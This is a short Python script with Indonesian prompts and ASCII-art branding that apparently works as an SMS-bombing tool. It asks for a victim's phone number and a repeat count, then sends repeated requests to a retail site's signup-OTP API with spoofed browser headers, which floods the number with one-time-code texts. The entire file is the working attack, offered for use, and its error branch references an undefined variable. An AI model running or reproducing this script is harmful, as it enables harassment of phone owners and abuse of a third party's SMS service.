import requests,json,time,os,sys




m = '\033[1;31m' # merah
b = '\033[1;36m' # biru
k = '\033[1;33m' # kuning
h = '\033[1;32m' # hijau
u = '\033[1;35m' # ungu
p = '\033[1;37m' # putih
ut = '\033[1;34m' # ungu tua


os.system('clear')
def asw(b):
  for m in b + "\n":
      sys.stdout.write(m)
      sys.stdout.flush()
      time.sleep(15./50)

def lo(s):
  for c in s + "\n":
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(5./100)


print(f"""{b}_                    _ _
| |    ___   __ _  __| (_)_ __   __ _
| |   / _ \ / _` |/ _` | | '_ \ / _` |
| |__| (_) | (_| | (_| | | | | | (_| |
|_____\___/ \__,_|\__,_|_|_| |_|\__, |
                                |___/
""")
print(f"{k}=======================================================================")
asw(f"{m}-------------------- {k}-----------------------{h}------------------------")
print(f"{k}=======================================================================")
time.sleep(3)
print("SABAR TOD!... NUNGGU 5 MENIT AJA")
time.sleep(5)
print("Weh Salah Ternyata 5 Detik Hehe ")
time.sleep(3)
os.system('clear')


lo(f"""{b} ____    _    ____  _  __      _   _ ___ ____ _   _ _____
|  _ \  / \  |  _ \| |/ /     | \ | |_ _/ ___| | | |_   _|
| | | |/ _ \ | |_) | ' /      |  \| || | |  _| |_| | | |
{p}| |_| / ___ \|  _ <| . \      | |\  || | |_| |  _  | | |
|____/_/   \_\_| \_\_|\_\     |_| \_|___\____|_| |_| |_|
""")


print(f"""
{b}Author  {m}: {m}DARK {p}NIGHT
{b}Github  {m}: {b}Https://{k}github.com{u}/Termux-1D
{b}Youtube {m}: {h}Termux {ut}ID
""")


print(f'{b}Ex : {h}0858{m}*******')

no = int(input(f"{b}Masukan {p}Nomor {b}Hp : "))
jumlah = int(input(f"{m}Jumlah {h}Spam : "))
aleju = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Referer': 'https://www.mapclub.com/en/user/signup',
}

dat = {
'phone':no,
}

for x in range(jumlah):
  time.sleep(2)
  sms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=aleju)
  if 'error' in sms.text:
    print('gagal',gagal)
  else:
    print('success',no)

